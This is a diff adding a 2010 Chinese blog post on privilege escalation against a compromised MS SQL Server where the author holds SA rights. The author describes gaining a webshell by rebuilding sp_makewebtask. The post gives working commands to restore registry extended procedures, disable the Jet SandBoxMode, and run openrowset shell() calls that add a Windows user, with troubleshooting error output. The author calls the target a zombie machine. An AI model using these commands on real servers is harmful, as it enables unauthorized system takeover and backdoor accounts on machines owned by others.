@@ -1,0 +1,63 @@
+沙盒提权的小tips
+2010年4月20日 Chinadu 发表评论 423 views 阅读评论 
+今天刚好发现有一个SA权限。服务器管理员将大部份扩展都删除了。最后自己重建sp_makewebtask存储才搞到一个webshell了。（重建办法，先找台正常主机，sp_helptext 'sp_makewebtask',将他的SQL语句重新拷到目标机器执行一次就行了）。
+
+当然有了webshell，无法满足我们贪婪的欲望。开始测试提权。有serv-u，但是提权失败了。也许大家会说用back log来提权。但是那个太慢了，要重启机器，会影响对方业务，同时又会给对方留下不好的印像。有人也许会说用读取系统账号的注册表，导入导出，克隆账号，这个办法也可行，但由于并非黑对方主机，还是要保证对方系统的安整性比较好。（也许是心理因素，^_^)
+
+最后只好试试沙盒模式。很多人SA直接用沙盒模式成功了好多机器，但我从来没实践过，也不太清楚成功率如何。只好拿他当回肉鸡尝试了。
+
+
+由于扩展被删除，先恢复对注册表的读写存储。
+
+dbcc addextendedproc ('xp_regread','xpstar.dll')
+
+dbcc addextendedproc ('xp_regwrite','xpstar.dll')
+
+修复沙盒的保护模式
+
+exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',0;--
+
+查看'SandBoxMode'值是否已经变成0了。
+
+exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines', 'SandBoxMode'
+
+最后调用沙盒模式
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=C:WINDOWSsystem32iasdnary.mdb','select shell("cmd.exe /c net user user passwd /add")')
+
+1.如果沙盒保护模式未“关闭”，会报错：
+
+服务器: 消息 7357，级别 16，状态 2，行 1
+未能处理对象 'select shell("cmd.exe /c net user user passwd /add")'。OLE DB 提供程序 'microsoft.jet.oledb.4.0' 指出该对象中没有任何列。
+OLE DB 错误跟踪［Non-interface error: OLE DB provider unable to process object, since the object has no columnsProviderName='microsoft.jet.oledb.4.0', Query=select shell("cmd.exe /c net user user passwd /add")'］。
+
+2.如果.mdb不存在或是输入路径错误
+
+服务器: 消息 7399，级别 16，状态 1，行 1
+OLE DB 提供程序 'microsoft.jet.oledb.4.0' 报错。
+[OLE/DB provider returned message: 找不到文件 'C:WINDOWSsystem32iasdnary1.mdb'。]
+OLE DB 错误跟踪［OLE/DB Provider 'microsoft.jet.oledb.4.0' IDBInitialize::Initialize returned 0x80004005:   ］。
+
+3.如果输入过程中多了一些空格，也会报错。尤其要注意这点，很多人直接网上找文章复制粘贴进去执行。
+
+服务器: 消息 7357，级别 16，状态 2，行 1
+未能处理对象 'select shell("cmd.exe /c net user user passwd /add")'。OLE DB 提供程序 'microsoft.jet.oledb.4.0' 指出该对象中没有任何列。
+OLE DB 错误跟踪［Non-interface error: OLE DB provider unable to process object, since the object has no columnsProviderName='microsoft.jet.oledb.4.0', Query=select shell("cmd.exe /c net user user passwd /add")'］。
+
+4.如果mdb权限和cmd.exe权限不对，同样会也出现问题。
+
+当mdb权限不对时，
+
+服务器: 消息 7320，级别 16，状态 2，行 1
+未能对 OLE DB 提供程序 'Microsoft.Jet.OLEDB.4.0' 执行查询。
+[OLE/DB provider returned message: 未知]
+OLE DB 错误跟踪［OLE/DB Provider 'Microsoft.Jet.OLEDB.4.0' ICommandText::Execute returned 0x80040e14］。
+
+5.如果net权限不对时，却没有任何提示。
+
+最终的提权办法就是在当前的web目录下面上传系统的ias.mdb和cmd.exe，net.exe三个文件。执行
+
+select * from openrowset('microsoft.jet.oledb.4.0',';database=E:webias.mdb','select shell("E:webcmd.exe /c E:webnet.exe user user passwd /add")')
+
+成功增加一个计算机用户。
+
